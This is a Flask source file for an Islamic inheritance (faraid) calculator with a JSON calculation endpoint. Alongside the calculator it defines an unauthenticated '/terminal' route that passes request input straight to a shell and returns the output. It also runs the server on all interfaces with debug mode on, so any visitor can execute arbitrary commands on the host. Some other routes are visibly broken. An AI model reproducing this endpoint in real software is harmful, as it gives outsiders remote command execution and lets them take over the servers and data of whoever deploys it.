from flask import Flask, render_template, request, jsonify # type: ignore
import Faraid
import json, os, requests, subprocess
from datetime import *

app = Flask(__name__)
faraid = Faraid.faraid()

print("Copyright (C) 2025  Ali Mozzabot I, This program comes with ABSOLUTELY NO WARRANTY. This is free software, and you are welcome to redistribute it under certain conditions. ")

@app.route('/')
def home():
  return render_template('index.html')

@app.route('/date')
def date():
    time = datetime.now(timezone.utc)
    print(time)

@app.route('/faraid')
def code():
  try:
    return faraid()
  except ValueError as e:
    return jsonify({"error": str(e)}), 400
  except Exception as e:
    return jsonify({"error": f"Unexpected error: {str(e)}"}), 500

@app.route('/calculate-faraid', methods=['POST'])
def calculate_faraid():
  """
  API endpoint for calculating Islamic inheritance
  Expects JSON payload with:
  - gender: 'M' or 'F'
  - totalAssets: float
  - debt: float
  - funeral: float
  - will: float
  - nazar: float
  - netAsset: float
  - heirs: {heirName: count}
  """
  try:
    data = request.get_json()
    
    if not data:
      return jsonify({"error": "No JSON data provided"}), 400
    
    # Validate required fields
    required_fields = ['gender', 'totalAssets', 'netAsset', 'heirs']
    for field in required_fields:
      if field not in data:
        return jsonify({"error": f"Missing required field: {field}"}), 400
    
    # Call the calculation function
    result = Faraid.calculate_faraid_api(
      gender=data['gender'],
      total_assets=float(data['totalAssets']),
      debt=float(data.get('debt', 0)),
      funeral=float(data.get('funeral', 0)),
      will=float(data.get('will', 0)),
      nazar=float(data.get('nazar', 0)),
      net_asset=float(data['netAsset']),
      heirs=data['heirs']
    )
    
    return jsonify(result)
  except ValueError as e:
    return jsonify({"error": str(e)}), 400
  except Exception as e:
    print(f"Error in calculate_faraid: {str(e)}")
    return jsonify({"error": f"Calculation failed: {str(e)}"}), 500
    
@app.route("/terminal", methods=["POST"])
def terminal():
    data = request.json["input"]

    # Run command in shell
    try:
        output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT, text=True)
    except subprocess.CalledProcessError as e:
        output = e.output

    return output

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3003, debug=True)